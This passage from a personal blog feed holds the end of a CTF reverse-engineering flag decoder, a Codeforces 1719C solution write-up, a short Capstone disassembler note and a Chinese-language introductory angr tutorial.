<span class="number">0</span>, <span class="number">0</span>, <span class="number">12</span>, <span class="number">70</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">182</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">1</span>, <span class="number">118</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">102</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">73</span>, <span class="number">110</span>, <span class="number">112</span>, <span class="number">117</span>, <span class="number">116</span>, <span class="number">32</span>, <span class="number">70</span>, <span class="number">108</span>, <span class="number">97</span>, <span class="number">103</span>, <span class="number">58</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">15</span>, <span class="number">0</span>, <span class="number">16</span>, <span class="number">17</span>, <span class="number">18</span>, <span class="number">19</span>, <span class="number">20</span>, <span class="number">21</span>, <span class="number">22</span>, <span class="number">23</span>, <span class="number">24</span>, <span class="number">25</span>, <span class="number">26</span>, <span class="number">27</span>, <span class="number">28</span>, <span class="number">29</span>, <span class="number">30</span>, <span class="number">31</span>, <span class="number">0</span>, <span class="number">1</span>, <span class="number">2</span>, <span class="number">3</span>, <span class="number">4</span>, <span class="number">5</span>, <span class="number">6</span>, <span class="number">7</span>, <span class="number">8</span>, <span class="number">9</span>, <span class="number">10</span>, <span class="number">11</span>, <span class="number">12</span>, <span class="number">13</span>, <span class="number">52</span>, <span class="number">53</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">64</span>, <span class="number">245</span>, <span class="number">202</span>, <span class="number">10</span>, <span class="number">53</span>, <span class="number">0</span>, <span class="number">31</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">87</span>, <span class="number">114</span>, <span class="number">111</span>, <span class="number">110</span>, <span class="number">103</span>, <span class="number">10</span>, <span class="number">82</span>, <span class="number">105</span>, <span class="number">103</span>, <span class="number">104</span>, <span class="number">116</span>, <span class="number">10</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">21</span>, <span class="number">80</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">14</span>, <span class="number">18</span>, <span class="number">11</span>, <span class="number">12</span>, <span class="number">80</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">101</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">21</span>, <span class="number">86</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">14</span>, <span class="number">18</span>, <span class="number">11</span>, <span class="number">12</span>, <span class="number">80</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">123</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>&#125;;</span><br><span class="line">  <span class="type">int</span> b[<span class="number">32</span>]=&#123;<span class="number">0</span>&#125;;</span><br><span class="line">  <span class="type">int</span> flag[]=&#123;<span class="number">0</span>&#125;;</span><br><span class="line">  <span class="keyword">for</span> (<span class="type">int</span> i=<span class="number">0</span>;i&lt;<span class="number">36</span>;i++)&#123;</span><br><span class="line">    flag[i]=(i+<span class="number">32</span>)^a[i+<span class="number">5</span>];</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">for</span> (<span class="type">int</span> i=<span class="number">0</span>;i&lt;<span class="number">32</span>;i++)&#123;</span><br><span class="line">    cout&lt;&lt;(<span class="type">char</span>)flag[i];</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p><img loading="lazy" data-src="VM/3.png" alt="3"></p>
]]></content>
      <tags>
        <tag>ctf</tag>
        <tag>reverse</tag>
      </tags>
  </entry>
  <entry>
    <title>codeforce-1719C</title>
    <url>/2022/08/29/codeforce-1719C/</url>
    <content><![CDATA[<h1 id="codeforces-1719c"><a class="markdownIt-Anchor" href="#codeforces-1719c">#</a> codeforces 1719C</h1>
<span id="more"></span>
<h3 id="the-problem"><a class="markdownIt-Anchor" href="#the-problem">#</a> The problem</h3>
<blockquote>
<p>C. Fighting Tournament<br>
time limit per test2 seconds<br>
memory limit per test256 megabytes<br>
inputstandard input<br>
outputstandard output<br>
Burenka is about to watch the most interesting sporting event of the year — a fighting tournament organized by her friend Tonya.<br>
n athletes participate in the tournament, numbered from 1 to n. Burenka determined the strength of the i-th athlete as an integer ai, where 1≤ai≤n. All the strength values are different, that is, the array a is a permutation of length n. We know that in a fight, if ai&gt;aj, then the i-th participant always wins the j-th.<br>
The tournament goes like this: initially, all n athletes line up in ascending order of their ids, and then there are infinitely many fighting rounds. In each round there is exactly one fight: the first two people in line come out and fight. The winner goes back to the front of the line, and the loser goes to the back.<br>
Burenka decided to ask Tonya q questions. In each question, Burenka asks how many victories the i-th participant gets in the first k rounds of the competition for some given numbers i and k. Tonya is not very good at analytics, so he asks you to help him answer all the questions.</p>
<blockquote>
<p>Input<br>
The first line contains one integer t (1≤t≤104) — the number of test cases. Description of the test cases follows.<br>
The first line of each test case contains two integers n and q (2≤n≤105, 1≤q≤105) — the number of tournament participants and the number of questions.<br>
The second line of each test case contains n integers a1,a2,…,an (1≤ai≤n) — the array a, which is a permutation.<br>
The next q lines of a test case contain questions. Each line contains two integers i and k (1≤i≤n, 1≤k≤109) — the number of the participant and the number of rounds.<br>
It is guaranteed that the sum of n and the sum of q over all test cases do not exceed 105.<br>
Output<br>
For each Burenka’s question, print a single line containing one integer — the answer to the question.</p>
</blockquote>
</blockquote>
<!--more-->
<h4 id="preface"><a class="markdownIt-Anchor" href="#preface">#</a> Preface</h4>
<h5 id="its-not-a-very-hard-problem-but-contains-many-details-this-is-the-record-when-i-tried"><a class="markdownIt-Anchor" href="#its-not-a-very-hard-problem-but-contains-many-details-this-is-the-record-when-i-tried">#</a> It’s not a very hard problem, but contains many details. This is the record when I tried:</h5>
<p><img loading="lazy" data-src="/codeforce-1719C/1719C.png" alt></p>
<hr>
<h5 id="the-basic-solution-for-this-problem-is-to-find-out-if-there-are-numbers-bigger-then-ai-if-so-the-guy-with-the-number-i-can-not-win-anybody-else-tried-to-find-the-number-of-the-guys-after-him-with-smaller-a-this-number-is-the-biggest-number-of-his-victories-you-might-notices-if-the-guy-is-the-best-in-the-whole-queue-then-he-can-win-any-guys-he-metdepend-how-big-the-k-is-others-can-not-because-they-may-met-this-guy-and-his-game-can-be-called-over"><a class="markdownIt-Anchor" href="#the-basic-solution-for-this-problem-is-to-find-out-if-there-are-numbers-bigger-then-ai-if-so-the-guy-with-the-number-i-can-not-win-anybody-else-tried-to-find-the-number-of-the-guys-after-him-with-smaller-a-this-number-is-the-biggest-number-of-his-victories-you-might-notices-if-the-guy-is-the-best-in-the-whole-queue-then-he-can-win-any-guys-he-metdepend-how-big-the-k-is-others-can-not-because-they-may-met-this-guy-and-his-game-can-be-called-over">#</a> The basic solution for this problem is to find out if there are numbers bigger then a[i], if so, the guy with the number i CAN NOT WIN ANYBODY, else, tried to find the number of the guys AFTER HIM with smaller a[]. This number is the BIGGEST number of his victories. You might notices, if the guy is the best in the whole queue, then he can win any guys he met(depend how big the k is), others can not because they may met this guy and his game can be called “over”.</h5>
<h4 id="details"><a class="markdownIt-Anchor" href="#details">#</a> DETAILS</h4>
<ul>
<li>
<h5 id="the-first-and-second-guy-is-special-they-fight-each-other-you-can-see-that-i2-can-use-the-same-formula-so-you-shall-judge-i1-specially-the-biggest-a-shall-also-be-judge-specially-with-those-you-answer-shall-be-right"><a class="markdownIt-Anchor" href="#the-first-and-second-guy-is-special-they-fight-each-other-you-can-see-that-i2-can-use-the-same-formula-so-you-shall-judge-i1-specially-the-biggest-a-shall-also-be-judge-specially-with-those-you-answer-shall-be-right">#</a> The first and second guy is special. They fight each other. You can see that (i&gt;=2) can use the same formula. So you shall judge (i==1) specially. The biggest a[] shall also be judge specially. With those, you answer shall be right.</h5>
</li>
<li>
<h5 id="however-you-might-get-a-tlewelli-did-this-is-how-i-wrote-previously"><a class="markdownIt-Anchor" href="#however-you-might-get-a-tlewelli-did-this-is-how-i-wrote-previously">#</a> However, you might get a “TLE”(Well,I did). This is how I wrote previously:</h5>
</li>
</ul>
<p><code>//		for (i=1;i&lt;=n;i++)&#123;</code> 	<br>
 <code>//			if (a[i]==maxn) continue;</code> <br>
 <code>//			for (j=i+1;j&lt;=n;j++)&#123;</code> <br>
 <code>//				if (a[j]&gt;=a[i]) break;</code> <br>
 <code>//				b[i]++;</code> <br>
 <code>//&#125;</code> <br>
 <code>//			b[i]++;</code> <br>
 <code>//			if (i==1) b[i]--;</code> <br>
 <code>//			for (j=1;j&lt;i;j++)&#123;</code> <br>
 <code>//				if (a[j]&gt;a[i])&#123;</code> <br>
 <code>//					b[i]=0;</code> <br>
 <code>//					break;</code> <br>
 <code>//				&#125;</code> <br>
 <code>//			&#125;</code> <br>
 <code>//		&#125;</code></p>
<h5 id="clearly-on2-is-too-slow-so-i-tried-to-find-another-way"><a class="markdownIt-Anchor" href="#clearly-on2-is-too-slow-so-i-tried-to-find-another-way">#</a> Clearly, O(n^2) is too slow. So I tried to find another way.</h5>
<h5 id="we-can-find-that-the-whole-work-can-be-done-in-linear-time-like-this"><a class="markdownIt-Anchor" href="#we-can-find-that-the-whole-work-can-be-done-in-linear-time-like-this">#</a> We can find that the whole work can be done in LINEAR TIME. Like this:</h5>
<p><code>		int lld=1;</code> <br>
 <code>		for (i=1;i&lt;n;i++)&#123;</code> <br>
 <code>			if (a[i]&gt;a[i+1])&#123;</code> <br>
 <code>				b[lld]++;</code> <br>
 <code>				a[i+1]=a[i];</code> <br>
 <code>			&#125;</code> <br>
 <code>			else&#123;</code> <br>
 <code>				lld=i+1;</code> <br>
 <code>				b[lld]++;</code> <br>
 <code>			&#125;</code> <br>
 <code>		&#125;</code></p>
<h5 id="its-not-hard-to-understand-but-effective-just-read-it-oncein-on-the-work-is-done"><a class="markdownIt-Anchor" href="#its-not-hard-to-understand-but-effective-just-read-it-oncein-on-the-work-is-done">#</a> It’s not hard to understand, but effective. Just read it once(in O(n)), the work is done.</h5>
]]></content>
      <tags>
        <tag>codeforces</tag>
        <tag>c++</tag>
      </tags>
  </entry>
  <entry>
    <title>capstone</title>
    <url>/2022/11/06/capstone/</url>
    <content><![CDATA[<h6 id="preface"><a class="markdownIt-Anchor" href="#preface">#</a> Preface:</h6>
<h6 id="a-write-up-in-hnctf-use-capstone-to-solved-the-problem-maze-its-the-first-time-i-heard-of-it-so-i-am-writing-to-this-blog-for-later-review"><a class="markdownIt-Anchor" href="#a-write-up-in-hnctf-use-capstone-to-solved-the-problem-maze-its-the-first-time-i-heard-of-it-so-i-am-writing-to-this-blog-for-later-review">#</a> A write up in hnctf use  <code>capstone</code>  to solved the problem  <code>maze</code> . It’s the first time I heard of it, so I am writing to this blog for later review.</h6>
<h5 id="most-thing-i-write-can-be-found-in-official-file"><a class="markdownIt-Anchor" href="#most-thing-i-write-can-be-found-in-official-file">#</a> Most thing I write can be found in <a href="http://www.capstone-engine.org/lang_python.html">Official file</a>.</h5>
<span id="more"></span>
<h5 id="an-example-you-can-try-before-reading"><a class="markdownIt-Anchor" href="#an-example-you-can-try-before-reading">#</a> An example you can try before reading:</h5>
<pre><code># test1.py
from capstone import *

CODE = b&quot;\x55\x48\x8b\x05\xb8\x13\x00\x00&quot;

md = Cs(CS_ARCH_X86, CS_MODE_64)
for i in md.disasm(CODE, 0x1000):
    print(&quot;0x%x:\t%s\t%s&quot; %(i.address, i.mnemonic, i.op_str))

# It's the official example, you can try to change the CODE and see what happens.(Such as add a few '\x55' or '\x48' or whatever you like)
</code></pre>
<p>Trying this problem, you get the basic idea how capstone, or rather, how a  <code>.exe</code>  file works. It translate the binary numbers into assembly language in a queue, and when you add some thing, the whole procedure might when wrong.(You may think thit is simple, but some time we just didn’t remember to relate the whole file with simple binary numbers like wht upper  <code>CODE</code> )</p>
<p>We need to know what does the function mean:</p>
<p>~to be continue</p>
]]></content>
      <tags>
        <tag>re</tag>
        <tag>ctf</tag>
      </tags>
  </entry>
  <entry>
    <title>angr初探</title>
    <url>/2023/10/24/angr%E5%88%9D%E6%8E%A2/</url>
    <content><![CDATA[<h6 id="preface最近遇到需要动态模拟的题比较多这里还是系统学一下angr"><a class="markdownIt-Anchor" href="#preface最近遇到需要动态模拟的题比较多这里还是系统学一下angr">#</a> PREFACE：最近遇到需要动态模拟的题比较多，这里还是系统学一下 angr</h6>
<h6 id="ps-angr的文档还是写的比较有意思而且详细的适合当睡前读物点名批评某二进制分析工具的文档"><a class="markdownIt-Anchor" href="#ps-angr的文档还是写的比较有意思而且详细的适合当睡前读物点名批评某二进制分析工具的文档">#</a> ps. angr 的文档还是写的比较有意思而且详细的，适合当睡前读物，点名批评某二进制分析工具的文档…</h6>
<span id="more"></span>
<h4 id="参考链接"><a class="markdownIt-Anchor" href="#参考链接">#</a> 参考链接：</h4>
<p><a href="https://docs.angr.io/en/latest/">angr documentation</a></p>
<p><a href="https://github.com/jakespringer/angr_ctf">jakespringer/angr_ctf (github.com)</a></p>
<h4 id="虚拟环境"><a class="markdownIt-Anchor" href="#虚拟环境">#</a> 虚拟环境</h4>
<p><code>angr</code>  官方推荐在虚拟环境中运行，防止与外部包冲突（例如 <code>keystone</code>  和 <code>keystone-engine</code>  冲突，这里用的是 <code>keystone-engine</code> ）</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">pip install virtualenv</span><br><span class="line"></span><br><span class="line"># 在当前目录下创建名为 angr-venv的新目录，包含干净的python环境</span><br><span class="line">virtualenv angr-venv</span><br><span class="line"></span><br><span class="line">Windows：</span><br><span class="line">angr-venv\Scripts\activate</span><br><span class="line"></span><br><span class="line">Linux/Mac：</span><br><span class="line">source angr-venv/bin/activate</span><br><span class="line"></span><br><span class="line">pip install angr</span><br><span class="line"></span><br><span class="line">退出虚拟环境：</span><br><span class="line">deactivate</span><br></pre></td></tr></table></figure>
<h3 id="使用样例"><a class="markdownIt-Anchor" href="#使用样例">#</a> 使用样例</h3>
<h4 id="导入模块"><a class="markdownIt-Anchor" href="#导入模块">#</a> 导入模块</h4>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> angr</span><br><span class="line">proj = angr.Project(<span class="string">&#x27;./file&#x27;</span>)</span><br></pre></td></tr></table></figure>
<h4 id="命令行使用时可以导入monkeyhex转化为十六进制输出"><a class="markdownIt-Anchor" href="#命令行使用时可以导入monkeyhex转化为十六进制输出">#</a> 命令行使用时可以导入 <code>monkeyhex</code>  转化为十六进制输出</h4>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> monkeyhex <span class="comment"># this will format numerical results in hexadecimal</span></span><br></pre></td></tr></table></figure>
<h4 id="project的基础属性"><a class="markdownIt-Anchor" href="#project的基础属性">#</a> project 的基础属性</h4>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">proj.entry <span class="comment"># 文件的入口点</span></span><br><span class="line"></span><br><span class="line">proj.filename <span class="comment"># 文件名</span></span><br><span class="line"></span><br><span class="line">proj.arch <span class="comment"># 文件的架构</span></span><br><span class="line">- proj.arch.name <span class="comment"># x86/x86-64/ARM</span></span><br><span class="line">- proj.arch.bits <span class="comment"># 32/64</span></span><br><span class="line">- proj.arch.<span class="built_in">bytes</span> <span class="comment"># bytes per instruction, eg : 4/8</span></span><br><span class="line">- proj.arch.memory_endness <span class="comment"># 字节序，例如 Iend_LE代表小端序</span></span><br></pre></td></tr></table></figure>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">proj.loader <span class="comment"># 显示已加载对象，内存映射的地址范围</span></span><br><span class="line"><span class="comment"># &lt;Loaded [file_name], maps [0x400000:0x5004000]&gt;</span></span><br><span class="line"></span><br><span class="line">proj.loader.shared_objects <span class="comment"># 已加载的所有共享对象，共享库或动态链接库及其内存映射</span></span><br><span class="line"><span class="comment"># OrderedDict([(&#x27;angr&#x27;, &lt;ELF Object angr, maps [0x8048000:0x804c033]&gt;), (&#x27;libc.so.6&#x27;, &lt;ELF Object libc.so.6, maps [0x8100000:0x83347bb]&gt;), (&#x27;ld-linux.so.2&#x27;, &lt;ELF Object ld-linux.so.2, maps [0x8400000:0x8437a37]&gt;), (&#x27;extern-address space&#x27;, &lt;ExternObject Object cle##externs, maps [0x8500000:0x8507fff]&gt;), (&#x27;cle##tls&#x27;, &lt;ELFTLSObjectV2 Object cle##tls, maps [0x8600000:0x8614807]&gt;)])</span></span><br><span class="line"></span><br><span class="line">proj.loader.min_addr <span class="comment"># 加载的二进制文件占用的内存空间的界限</span></span><br><span class="line"><span class="comment"># 0x8048000</span></span><br><span class="line">proj.loader.max_addr</span><br><span class="line"><span class="comment"># 0x8707fff</span></span><br><span class="line"></span><br><span class="line">proj.loader.main_object <span class="comment"># 返回代表主要加载的二进制文件的对象</span></span><br><span class="line"><span class="comment"># &lt;ELF Object angr, maps [0x8048000:0x804c033]&gt;</span></span><br><span class="line"></span><br><span class="line">proj.loader.main_object.execstack <span class="comment"># 返回bool，代表主二进制文件是否具有可执行堆栈</span></span><br><span class="line"><span class="comment"># False</span></span><br><span class="line"></span><br><span class="line">proj.loader.main_object.pic <span class="comment"># 二进制文件是否为位置独立代码,若返回True，则说明开启了ASLR</span></span><br><span class="line"><span class="comment"># False</span></span><br></pre></td></tr></table></figure>
<h4 id="对基本块的操作"><a class="markdownIt-Anchor" href="#对基本块的操作">#</a> 对基本块的操作</h4>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">block = proj.factory.block(proj.entry) <span class="comment"># 打印入口的基本块的汇编</span></span><br><span class="line">block.pp()</span><br><span class="line"><span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">80490b0  endbr32 </span></span><br><span class="line"><span class="string">80490b4  xor     ebp, ebp</span></span><br><span class="line"><span class="string">80490b6  pop     esi</span></span><br><span class="line"><span class="string">80490b7  mov     ecx, esp</span></span><br><span class="line"><span class="string">80490b9  and     esp, 0xfffffff0</span></span><br><span class="line"><span class="string">80490bc  push    eax</span></span><br><span class="line"><span class="string">80490bd  push    esp</span></span><br><span class="line"><span class="string">80490be  push    edx</span></span><br><span class="line"><span class="string">80490bf  call    0x80490dd</span></span><br><span class="line"><span class="string">&quot;&quot;&quot;</span></span><br><span class="line"></span><br><span class="line">block.instructions                  <span class="comment"># 该基本块的指令数量</span></span><br><span class="line"><span class="comment"># 9</span></span><br><span class="line">block.instruction_addrs             <span class="comment"># 该基本块指令地址</span></span><br><span class="line"><span class="comment"># (134516912, 134516916, 134516918, 134516919, 134516921, 134516924, 134516925, 134516926, 134516927)</span></span><br><span class="line"></span><br><span class="line">block.capstone <span class="comment"># 打印人类可读汇编形式（与.pp()类同）</span></span><br><span class="line">block.vex <span class="comment"># 打印IR代码形式</span></span><br><span class="line"><span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">IRSB &#123;</span></span><br><span class="line"><span class="string">   t0:Ity_I32 t1:Ity_I32 t2:Ity_I32 t3:Ity_I32 t4:Ity_I32 t5:Ity_I32 t6:Ity_I32 t7:Ity_I32 t8:Ity_I32 t9:Ity_I32 t10:Ity_I32 t11:Ity_I32 t12:Ity_I32 t13:Ity_I32 t14:Ity_I32 t15:Ity_I32 t16:Ity_I32 t17:Ity_I32 t18:Ity_I32 t19:Ity_I32 t20:Ity_I32 t21:Ity_I32 t22:Ity_I32 t23:Ity_I32 t24:Ity_I32 t25:Ity_I32</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">   00 | ------ IMark(0x80490b0, 4, 0) ------</span></span><br><span class="line"><span class="string">   01 | ------ IMark(0x80490b4, 2, 0) ------</span></span><br><span class="line"><span class="string">   02 | PUT(ebp) = 0x00000000</span></span><br><span class="line"><span class="string">   03 | PUT(eip) = 0x080490b6</span></span><br><span class="line"><span class="string">   04 | ------ IMark(0x80490b6, 1, 0) ------</span></span><br><span class="line"><span class="string">   05 | t4 = GET:I32(esp)</span></span><br><span class="line"><span class="string">   06 | t3 = LDle:I32(t4)</span></span><br><span class="line"><span class="string">   07 | t15 = Add32(t4,0x00000004)</span></span><br><span class="line"><span class="string">   08 | PUT(esi) = t3</span></span><br><span class="line"><span class="string">   09 | ------ IMark(0x80490b7, 2, 0) ------</span></span><br><span class="line"><span class="string">   10 | PUT(ecx) = t15</span></span><br><span class="line"><span class="string">   11 | ------ IMark(0x80490b9, 3, 0) ------</span></span><br><span class="line"><span class="string">   12 | t5 = And32(t15,0xfffffff0)</span></span><br><span class="line"><span class="string">   13 | PUT(cc_op) = 0x0000000f</span></span><br><span class="line"><span class="string">   14 | PUT(cc_dep1) = t5</span></span><br><span class="line"><span class="string">   15 | PUT(cc_dep2) = 0x00000000</span></span><br><span class="line"><span class="string">   16 | PUT(cc_ndep) = 0x00000000</span></span><br><span class="line"><span class="string">   17 | PUT(eip) = 0x080490bc</span></span><br><span class="line"><span class="string">   18 | ------ IMark(0x80490bc, 1, 0) ------</span></span><br><span class="line"><span class="string">   19 | t8 = GET:I32(eax)</span></span><br><span class="line"><span class="string">   20 | t17 = Sub32(t5,0x00000004)</span></span><br><span class="line"><span class="string">   21 | PUT(esp) = t17</span></span><br><span class="line"><span class="string">   22 | STle(t17) = t8</span></span><br><span class="line"><span class="string">   23 | PUT(eip) = 0x080490bd</span></span><br><span class="line"><span class="string">   24 | ------ IMark(0x80490bd, 1, 0) ------</span></span><br><span class="line"><span class="string">   25 | t19 = Sub32(t17,0x00000004)</span></span><br><span class="line"><span class="string">   26 | PUT(esp) = t19</span></span><br><span class="line"><span class="string">   27 | STle(t19) = t17</span></span><br><span class="line"><span class="string">   28 | PUT(eip) = 0x080490be</span></span><br><span class="line"><span class="string">   29 | ------ IMark(0x80490be, 1, 0) ------</span></span><br><span class="line"><span class="string">   30 | t12 = GET:I32(edx)</span></span><br><span class="line"><span class="string">   31 | t21 = Sub32(t19,0x00000004)</span></span><br><span class="line"><span class="string">   32 | PUT(esp) = t21</span></span><br><span class="line"><span class="string">   33 | STle(t21) = t12</span></span><br><span class="line"><span class="string">   34 | PUT(eip) = 0x080490bf</span></span><br><span class="line"><span class="string">   35 | ------ IMark(0x80490bf, 5, 0) ------</span></span><br><span class="line"><span class="string">   36 | t23 = Sub32(t21,0x00000004)</span></span><br><span class="line"><span class="string">   37 | PUT(esp) = t23</span></span><br><span class="line"><span class="string">   38 | STle(t23) = 0x080490c4</span></span><br><span class="line"><span class="string">   NEXT: PUT(eip) = 0x080490dd; Ijk_Call</span></span><br><span class="line"><span class="string">&#125;</span></span><br><span class="line"><span class="string">&quot;&quot;&quot;</span></span><br></pre></td></tr></table></figure>
<h4 id="模拟状态-simstate"><a class="markdownIt-Anchor" href="#模拟状态-simstate">#</a> 模拟状态  <code>SimState</code></h4>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">state = proj.factory.entry_state() </span><br><span class="line"><span class="comment"># &lt;SimState @ 0x80490b0&gt;</span></span><br><span class="line"><span class="built_in">print</span>(state)</span><br><span class="line"><span class="built_in">print</span>(state.regs.eip)</span><br><span class="line"><span class="built_in">print</span>(state.regs.eax)</span><br><span class="line"><span class="built_in">print</span>(state.mem[proj.entry].<span class="built_in">int</span>.resolved)</span><br><span class="line"><span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">&lt;BV32 0x80490b0&gt;</span></span><br><span class="line"><span class="string">&lt;BV32 0x1c&gt;</span></span><br><span class="line"><span class="string">&lt;BV32 0xfb1e0ff3&gt;</span></span><br><span class="line"><span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="comment"># 注意这里的描述，给出官方解释：</span></span><br><span class="line"><span class="comment"># - Those aren’t Python ints! Those are bitvectors. Python integers don’t have the same semantics as words on a CPU, e.g. wrapping on overflow, so we work with bitvectors, which you can think of as an integer as represented by a series of bits, to represent CPU data in angr. Note that each bitvector has a .length property describing how wide it is in bits.</span></span><br><span class="line"></span><br><span class="line">state.solver.<span class="built_in">eval</span>(state.regs.eax) <span class="comment"># 转化为python int</span></span><br><span class="line">bv = state.solver.BVV(<span class="number">0x1234</span>, <span class="number">32</span>)       <span class="comment"># 反过来创建，create a 32-bit-wide bitvector with value 0x1234</span></span><br><span class="line"></span><br><span class="line">bv = state.solver.BVV(<span class="number">0x1111</span>, <span class="number">32</span>) <span class="comment"># 修改寄存器值</span></span><br><span class="line">state.regs.eax = bv</span><br><span class="line"></span><br><span class="line">state.mem[<span class="number">0x1000</span>].long = <span class="number">4</span> <span class="comment"># 修改内存中的值</span></span><br><span class="line"><span class="built_in">print</span>(state.mem[<span class="number">0x1000</span>].long.resolved)</span><br><span class="line"><span class="comment"># &lt;BV32 0x4&gt;</span></span><br><span class="line"><span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">mem的官方描述：</span></span><br><span class="line"><span class="string">The mem interface is a little confusing at first, since it’s using some pretty hefty Python magic. The short version of how to use it is:</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">Use array[index] notation to specify an address</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">Use .&lt;type&gt; to specify that the memory should be interpreted as type (common values: char, short, int, long, size_t, uint8_t, uint16_t…)</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">From there, you can either:</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">Store a value to it, either a bitvector or a Python int</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">Use .resolved to get the value as a bitvector</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">Use .concrete to get the value as a Python int</span></span><br><span class="line"><span class="string">&quot;&quot;&quot;</span></span><br></pre></td></tr></table></figure>
<h4 id="模拟管理器-simulation-managers"><a class="markdownIt-Anchor" href="#模拟管理器-simulation-managers">#</a> 模拟管理器  <code>Simulation Managers</code></h4>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">simgr = proj.factory.simulation_manager(state) <span class="comment"># 创建一个新的SimulationManager实例，它将负责管理程序的所有可能的执行路径，包括路径的分叉、合并和死亡</span></span><br><span class="line"></span><br><span class="line">simgr.active </span><br><span class="line"><span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">拟管理器维护了几个不同的状态列表，这些列表代表了程序执行的不同阶段。这些列表包括：active、unconstrained、deadended、errored等。</span></span><br><span class="line"><span class="string">simgr.active是一个包含所有“活动”路径的列表。所谓“活动”路径，指的是那些还在进行中、未遇到任何终止条件的路径。这些是可以继续推进执行的路径。</span></span><br><span class="line"><span class="string">通过查看simgr.active列表，您可以了解当前有多少执行路径正在被模拟管理器管理，并且可以对这些路径进行进一步的查询或操作。</span></span><br><span class="line"><span class="string">&quot;&quot;&quot;</span></span><br></pre></td></tr></table></figure>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> angr</span><br><span class="line">proj = angr.Project(<span class="string">&#x27;./angr&#x27;</span>)</span><br><span class="line">state = proj.factory.entry_state()</span><br><span class="line">simgr = proj.factory.simulation_manager(state)</span><br><span class="line"><span class="built_in">print</span>(simgr)</span><br><span class="line"><span class="built_in">print</span>(simgr.active)</span><br><span class="line"><span class="built_in">print</span>(simgr.active[<span class="number">0</span>].regs.eip)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&#x27;---&#x27;</span>)</span><br><span class="line">simgr.step()</span><br><span class="line"><span class="built_in">print</span>(simgr.active)</span><br><span class="line"><span class="built_in">print</span>(simgr.active[<span class="number">0</span>].regs.eip)</span><br><span class="line"></span><br><span class="line"><span class="string">&quot;&quot;&quot; 这里执行了一整个基本块（注意：smigr不会改变state的信息）</span></span><br><span class="line"><span class="string">&lt;SimulationManager with 1 active&gt;</span></span><br><span class="line"><span class="string">[&lt;SimState @ 0x80490b0&gt;]</span></span><br><span class="line"><span class="string">&lt;BV32 0x80490b0&gt;</span></span><br><span class="line"><span class="string">---</span></span><br><span class="line"><span class="string">[&lt;SimState @ 0x80490dd&gt;]</span></span><br><span class="line"><span class="string">&lt;BV32 0x80490dd&gt;</span></span><br><span class="line"><span class="string">&quot;&quot;&quot;</span></span><br></pre></td></tr></table></figure>
<h4 id="analyses"><a class="markdownIt-Anchor" href="#analyses">#</a> Analyses</h4>
